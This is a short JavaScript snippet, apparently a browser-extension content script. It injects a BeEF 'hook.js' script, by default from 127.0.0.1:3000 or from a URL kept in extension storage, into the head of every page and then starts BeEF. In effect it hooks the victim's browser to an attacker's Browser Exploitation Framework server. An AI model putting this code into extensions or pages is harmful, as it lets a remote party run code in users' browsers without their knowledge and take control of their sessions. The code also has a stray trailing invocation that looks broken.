chrome.storage.local.get(null, (res) => {
  var url = "http://127.0.0.1:3000/hook.js";
  if (res.url) {
    url = res.url;
  }
  var head = document.getElementsByTagName('head')[0];
  var script = document.createElement('script');
  script.async = "true";
  script.type = 'text/javascript';
  script.src = url;
  head.appendChild(script);
  beef = true;
})();

setTimeout(beef_init, 10000)